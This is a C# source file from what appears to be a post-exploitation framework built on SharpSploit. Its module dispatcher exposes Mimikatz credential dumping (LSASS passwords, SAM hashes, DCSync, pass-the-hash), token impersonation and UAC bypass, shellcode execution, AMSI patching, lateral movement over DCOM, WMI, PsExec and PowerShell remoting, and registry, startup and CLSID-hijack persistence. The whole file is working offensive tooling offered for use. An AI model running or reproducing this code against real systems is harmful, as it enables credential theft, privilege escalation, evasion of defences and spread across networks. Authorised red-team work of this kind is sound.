using System;
using System.Collections.Generic;
using System.IO;

namespace SharpSploit.Cute
{
    class CuteModule
    {
        // This class is for any module loaded
        // Contains function mappings, and methods to get/set options for each module

        // Module data
        private String ModuleName, ModuleHelp;
        private Dictionary<String, Object> ModuleOptions = new Dictionary<string, Object>();         

        // Constructor
        public CuteModule(String ModuleName)
        {
            // Initialize module with given name, set name to invalid if there is no such module
            this.ModuleName = ModuleName;
            switch (ModuleName)
            {
                case "credentials/mimikatz/all":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes each of the builtin local commands (not DCSync). (Requires Admin)";
                    break;
                case "credentials/mimikatz/command":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes a chosen Mimikatz command.";
                    ModuleOptions.Add("command", "");
                    break;
                case "credentials/mimikatz/mimikatz_shell":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and gives (pseudo) shell to it. Runs \"privilege::debug\" prior to executing your commands. For commands with spaces in them, enclose them in double quotes.";
                    break;
                case "credentials/mimikatz/dcsync":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the 'dcsync' module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)";
                    ModuleOptions.Add("user","");
                    ModuleOptions.Add("fqdn","");
                    ModuleOptions.Add("dc", "");
                    break;
                case "credentials/mimikatz/logonpasswords":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the Mimikatzcommand to retrieve plaintext passwords from LSASS. Equates to Command('privilege::debug sekurlsa::logonPasswords'). (Requires Admin)";
                    break;
                case "credentials/mimikatz/lsacache":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the Mimikatz command to retrieve Domain Cached Credentials hashes from registry. Equates to Command('privilege::debug lsadump::cache'). (Requires Admin)";
                    break;
                case "credentials/mimikatz/lsasecrets":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the Mimikatz command to retrieve LSA secrets stored in registry. Equates to Command('privilege::debug lsadump::secrets'). (Requires Admin)";
                    break;
                case "credentials/mimikatz/pth":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the 'pth' module to start a new process as a user using an NTLM password hash for authentication.";
                    ModuleOptions.Add("user", "");
                    ModuleOptions.Add("ntlm", "");
                    ModuleOptions.Add("fqdn", "");
                    ModuleOptions.Add("run", "");
                    break;
                case "credentials/mimikatz/samdump":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the Mimikatz command to retrieve password hashes from the SAM database. Equates to Command('privilege::debug lsadump::sam'). (Requires Admin)";
                    break;
                case "credentials/mimikatz/wdigest":
                    ModuleHelp = "Loads the Mimikatz PE with PE.Load() and executes the Mimikatz command to retrieve Wdigest credentials from registry. Equates to Command('sekurlsa::wdigest').";
                    break;
                case "credentials/tokens/bypassuac":
                    ModuleOptions.Add("binary","cmd.exe");
                    ModuleOptions.Add("arguments", "");                    
                    ModuleOptions.Add("path", Environment.GetEnvironmentVariable("windir") + "\\System32\\");
                    ModuleOptions.Add("process_id", "0");
                    ModuleHelp = "Bypasses UAC through token duplication and spawns a specified process. (Requires Admin)";
                    break;
                case "credentials/tokens/getsystem":
                    ModuleHelp = "Impersonate the SYSTEM user. Equates to ImpersonateUser('NT AUTHORITY\\SYSTEM'). (Requires Admin)";
                    break;
                case "credentials/tokens/impersonateprocess":
                    ModuleOptions.Add("process_id","0");
                    ModuleHelp = "Impersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process. (Requires Admin)";
                    break;
                case "credentials/tokens/impersonateuser":
                    ModuleOptions.Add("username", "");
                    ModuleHelp = "Find a process owned by the specificied user and impersonate the token. Used to execute subsequent commands as the specified user. (Requires Admin)";
                    break;
                case "credentials/tokens/maketoken":
                    ModuleOptions.Add("username", "");
                    ModuleOptions.Add("domain","");
                    ModuleOptions.Add("password", "");
                    ModuleOptions.Add("logon_type", "remote");
                    ModuleHelp = "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user. LogonTypes can be either 'remote' or 'local'";
                    break;
                case "credentials/tokens/rev2self":
                    ModuleHelp = "Ends the impersonation of any token, reverting back to the initial token associated with the current process. Useful in conjuction with functions that impersonate a token and do not automatically RevertToSelf, such as: ImpersonateUser(), ImpersonateProcess(), GetSystem(), and MakeToken().";
                    break;
                case "execution/execute_dotnet_exe_method":
                    ModuleHelp = "Reflectively load a .NET executable and execute any method in any type in it";
                    ModuleOptions.Add("exe_path","");
                    ModuleOptions.Add("arguments", "");
                    ModuleOptions.Add("type_name","");
                    ModuleOptions.Add("method_name","");
                    break;
                case "execution/execute_dotnet_exe":
                    ModuleHelp = "Reflectively load and execute any .NET executable";
                    ModuleOptions.Add("exe_path","");
                    ModuleOptions.Add("arguments","");
                    break;
                case "execution/execute_powershell_cmd":
                    ModuleHelp = "Executes specified PowerShell code using System.Management.Automation.dll and bypasses AMSI, ScriptBlock Logging, and Module Logging (but not Transcription Logging).";
                    ModuleOptions.Add("command","");
                    break;
                case "execution/execute_shell_cmd":
                    ModuleHelp = "Executes a specified Shell command, optionally with an alternative username and password. Leave username, password and domain blank to use the current one (defaults).";
                    ModuleOptions.Add("command", "");
                    ModuleOptions.Add("username", "");
                    ModuleOptions.Add("domain", "");
                    ModuleOptions.Add("password", "");
                    break;
                case "execution/execute_shellcode":
                    ModuleHelp = "Executes a specified ShellCode binary file by copying it to pinned memory, modifying the memory permissions with VirtualProtect(), and executing using a delegate.";
                    ModuleOptions.Add("shellcode_file", "");
                    break;
                case "lateral_movement/dcom/remote_exec":
                    ModuleHelp = "Execute a process on a remote system using various DCOM methods. Supported methods are: 'ExcelDDE','MMC20_Application','ShellBrowserWindow','ShellWindows'";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("command", "");
                    ModuleOptions.Add("parameters", "");
                    ModuleOptions.Add("directory", "");
                    ModuleOptions.Add("dcom_method", "mmc20_application");
                    break;
                case "lateral_movement/wmi/remote_exec":
                    ModuleHelp = "Execute a process on a remote system using the WMI Win32_Process.Create method.";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("command", "");
                    ModuleOptions.Add("username", "");
                    ModuleOptions.Add("password", "");
                    break;
                case "lateral_movement/service/create_new_remote_service":
                    ModuleHelp = "Create a new service on a remote machine";
                    ModuleOptions.Add("computer_name","");
                    ModuleOptions.Add("service_name", "");
                    ModuleOptions.Add("service_display_name", "");
                    ModuleOptions.Add("binary_path", "");
                    break;
                case "lateral_movement/service/delete_remote_service":
                    ModuleHelp = "Delete a service on a remote machine";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("service_name", "");
                    break;

                case "lateral_movement/service/start_remote_service":
                    ModuleHelp = "Start a service on a remote machine";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("service_name", "");
                    break;
                case "lateral_movement/service/stop_remote_service":
                    ModuleHelp = "Stop a service on a remote machine";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("service_name", "");
                    break;
                case "lateral_movement/psexec/remote_exec":
                    ModuleHelp = "Execute a remote process with a PSExec-like technique";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("binary_path", "");
                    ModuleOptions.Add("service_name", "");
                    ModuleOptions.Add("service_display_name", "");                    
                    break;
                case "lateral_movement/psremote/remote_exec":
                    ModuleHelp = "Invoke a Powershell command on a remote machine";
                    ModuleOptions.Add("computer_name", "");
                    ModuleOptions.Add("command", "");
                    ModuleOptions.Add("domain", "");
                    ModuleOptions.Add("username", "");
                    ModuleOptions.Add("password", "");
                    break;
                case "persistence/com/hijack_clsid":
                    ModuleHelp = "Hijacks a CLSID key to execute a payload.";
                    ModuleOptions.Add("clsid","");
                    ModuleOptions.Add("executable_path", "");
                    break;
                case "persistence/autorun/install_autorun":
                    ModuleHelp = "Install an autorun value in the registry to execute a payload";
                    ModuleOptions.Add("target_hive", "");
                    ModuleOptions.Add("value", "");
                    ModuleOptions.Add("name", "");
                    break;
                case "persistence/startup/install_startup_payload":
                    ModuleHelp = "Install a payload to run whenever the current user logs in.";
                    ModuleOptions.Add("payload","");
                    ModuleOptions.Add("filename_to_save_with", "");
                    break;
                case "evasion/amsi/patch_amsi_dll":
                    ModuleHelp = "Patch amsi.dll to bypass AMSI";
                    break;
                default:
                    this.ModuleName = "INVALID";
                    break;
            }
        }

        // Run the module with the currently set options
        public Object Run()
        {
            if (ModuleName.Equals("INVALID"))
            {
                return "No module selected";
            }
            switch (ModuleName)
            {
                case "credentials/mimikatz/all":
                    return SharpSploit.Credentials.Mimikatz.All();
                case "credentials/mimikatz/command":
                    return SharpSploit.Credentials.Mimikatz.Command(
                            GetModuleOptionValue("command")
                        );
                case "credentials/mimikatz/mimikatz_shell":
                    String Input = "";
                    while (true)
                    {                        
                        Console.Write("Mimikatz # ");
                        Input = "privilege::debug " + Console.ReadLine();
                        if (Input.ToLower().Contains(" exit"))
                        {
                            break;
                        }
                        Console.WriteLine(SharpSploit.Credentials.Mimikatz.Command(Input));
                    }
                    return true;
                case "credentials/mimikatz/dcsync":
                    return SharpSploit.Credentials.Mimikatz.DCSync(
                            GetModuleOptionValue("user"),
                            GetModuleOptionValue("fqdn"),
                            GetModuleOptionValue("dc")
                        );
                case "credentials/mimikatz/logonpasswords":
                    return SharpSploit.Credentials.Mimikatz.LogonPasswords();
                case "credentials/mimikatz/lsacache":
                    return SharpSploit.Credentials.Mimikatz.LsaCache();
                case "credentials/mimikatz/lsasecrets":
                    return SharpSploit.Credentials.Mimikatz.LsaSecrets();
                case "credentials/mimikatz/pth":
                    return SharpSploit.Credentials.Mimikatz.PassTheHash(
                            GetModuleOptionValue("user"),
                            GetModuleOptionValue("ntlm"),
                            GetModuleOptionValue("fqdn"),
                            GetModuleOptionValue("run")
                        );
                case "credentials/mimikatz/samdump":
                    return SharpSploit.Credentials.Mimikatz.SamDump();
                case "credentials/mimikatz/wdigest":
                    return SharpSploit.Credentials.Mimikatz.Wdigest();
                case "credentials/tokens/bypassuac":
                    return CuteHelper.GetCurrentToken().BypassUAC(
                            GetModuleOptionValue("binary"),
                            GetModuleOptionValue("arguments"),
                            GetModuleOptionValue("path"),
                            Int32.Parse(GetModuleOptionValue("process_id"))
                        );
                case "credentials/tokens/getsystem":
                    return CuteHelper.GetCurrentToken().GetSystem();
                case "credentials/tokens/impersonateprocess":
                    return CuteHelper.GetCurrentToken().ImpersonateProcess(
                            UInt32.Parse(GetModuleOptionValue("process_id"))
                        );
                case "credentials/tokens/impersonateuser":
                    return CuteHelper.GetCurrentToken().ImpersonateUser(
                            GetModuleOptionValue("username")
                        );
                case "credentials/tokens/maketoken":
                    SharpSploit.Execution.Win32.Advapi32.LOGON_TYPE LogonType = GetModuleOptionValue("logon_type").Equals("remote") ? SharpSploit.Execution.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS : SharpSploit.Execution.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE;
                    return CuteHelper.GetCurrentToken().MakeToken(
                            GetModuleOptionValue("username"),
                            GetModuleOptionValue("domain"),
                            GetModuleOptionValue("password"),
                            LogonType
                        );
                case "credentials/tokens/rev2self":
                    return CuteHelper.GetCurrentToken().RevertToSelf();
                case "execution/execute_dotnet_exe":
                    SharpSploit.Execution.Assembly.AssemblyExecute(
                            File.ReadAllBytes(GetModuleOptionValue("exe_path")),
                            GetModuleOptionValue("arguments").ToString().Split(' ')
                        );
                    return null;
                case "execution/execute_dotnet_exe_method":
                    SharpSploit.Execution.Assembly.AssemblyExecute(
                            File.ReadAllBytes(GetModuleOptionValue("exe_path")),
                            GetModuleOptionValue("type_name"),
                            GetModuleOptionValue("method_name"),
                            GetModuleOptionValue("arguments").ToString().Split(' ')
                        );
                    return null;
                case "execution/execute_powershell_cmd":
                    return SharpSploit.Execution.Shell.PowerShellExecute(
                            GetModuleOptionValue("command")
                        );
                case "execution/execute_shell_cmd":
                    return SharpSploit.Execution.Shell.ShellCmdExecute(
                            GetModuleOptionValue("command"),
                            GetModuleOptionValue("username"),
                            GetModuleOptionValue("domain"),
                            GetModuleOptionValue("password")
                        );
                case "execution/execute_shellcode":
                    return SharpSploit.Execution.ShellCode.ShellCodeExecute(
                            File.ReadAllBytes(GetModuleOptionValue("shellcode_file"))
                        );
                case "lateral_movement/dcom/remote_exec":
                    int dCOMMethod = 0;
                    String DCOMMethodStr = GetModuleOptionValue("dcom_method");
                    switch (DCOMMethodStr.ToLower())
                    {
                        case "exceldde":
                            dCOMMethod = (int)SharpSploit.LateralMovement.DCOM.DCOMMethod.ExcelDDE;
                            break;
                        case "mmc20_application":
                            dCOMMethod = (int)SharpSploit.LateralMovement.DCOM.DCOMMethod.MMC20_Application;
                            break;
                        case "shellbrowserwindow":
                            dCOMMethod = (int)SharpSploit.LateralMovement.DCOM.DCOMMethod.ShellBrowserWindow;
                            break;
                        case "shellwindows":
                            dCOMMethod = (int)SharpSploit.LateralMovement.DCOM.DCOMMethod.ShellWindows;
                            break;
                    }
                    return SharpSploit.LateralMovement.DCOM.DCOMExecute(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("command"),
                            GetModuleOptionValue("parameters"),
                            GetModuleOptionValue("directory"),
                            (LateralMovement.DCOM.DCOMMethod)dCOMMethod
                        );
                case "lateral_movement/wmi/remote_exec":
                    return SharpSploit.LateralMovement.WMI.WMIExecute(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("command"),
                            GetModuleOptionValue("username"),
                            GetModuleOptionValue("password")
                        );
                case "lateral_movement/service/create_new_remote_service":
                    return SharpSploit.LateralMovement.SCM.CreateService(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("service_name"),
                            GetModuleOptionValue("service_display_name"),
                            GetModuleOptionValue("binary_path")
                        );
                case "lateral_movement/service/delete_remote_service":
                    return SharpSploit.LateralMovement.SCM.DeleteService(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("service_name")
                        );
                case "lateral_movement/service/start_remote_service":
                    return SharpSploit.LateralMovement.SCM.StartService(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("service_name")
                        );
                case "lateral_movement/service/stop_remote_service":
                    return SharpSploit.LateralMovement.SCM.StopService(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("service_name")
                        );
                case "lateral_movement/psexec/remote_exec":
                    return SharpSploit.LateralMovement.SCM.PSExec(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("binary_path"),
                            GetModuleOptionValue("service_name"),
                            GetModuleOptionValue("service_display_name")
                        );
                case "lateral_movement/psremote/remote_exec":
                    return SharpSploit.LateralMovement.PowerShellRemoting.InvokeCommand(
                            GetModuleOptionValue("computer_name"),
                            GetModuleOptionValue("command"),
                            GetModuleOptionValue("domain"),
                            GetModuleOptionValue("username"),
                            GetModuleOptionValue("password")
                        );
                case "persistence/autorun/install_autorun":
                    return SharpSploit.Persistence.Autorun.InstallAutorun(
                            GetModuleOptionValue("target_hive"),
                            GetModuleOptionValue("value"),
                            GetModuleOptionValue("name")
                        );
                case "persistence/com/hijack_clsid":
                    return SharpSploit.Persistence.COM.HijackCLSID(
                            GetModuleOptionValue("clsid"),
                            GetModuleOptionValue("executable_path")
                        );
                case "persistence/startup/install_startup_payload":
                    return SharpSploit.Persistence.Startup.InstallStartup(
                            GetModuleOptionValue("payload"),
                            GetModuleOptionValue("filename_to_save_with")
                        );
                case "evasion/amsi/patch_amsi_dll":
                    return SharpSploit.Evasion.Amsi.PatchAmsiScanBuffer();
                default:
                    return false;
            }
        }

        // Returns module info if not invalid
        public String GetModuleInfo()
        {
            if (IsInvalid())
            {
                return "No module selected";
            }

            String ModuleHelp = this.ModuleHelp;
            ModuleHelp += "\n\nOptions (if any):\n";
            foreach (KeyValuePair<String,Object> KeyValue in ModuleOptions)
            {
                ModuleHelp += String.Format("{0} : {1}\n",KeyValue.Key,KeyValue.Value);
            }
            return ModuleHelp;
        }

        // Checks if module is invalid
        public bool IsInvalid()
        {
            if (ModuleName == "INVALID")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        // Returns module name
        public String GetModuleName()
        {
            return ModuleName;
        }

        // Gets value of any specified module option
        public String GetModuleOptionValue(String OptionName)
        {
            if (ModuleOptions.ContainsKey(OptionName))
            {
                return (String)ModuleOptions[OptionName];
            }
            return null;
            
        }

        // Sets value of any specified module option
        public bool SetModuleOptionValue(String OptionName, String OptionValue)
        {
            if (ModuleOptions.ContainsKey(OptionName))
            {
                ModuleOptions[OptionName] = OptionValue;
                return true;
            }
            return false;
        }        
    }
}
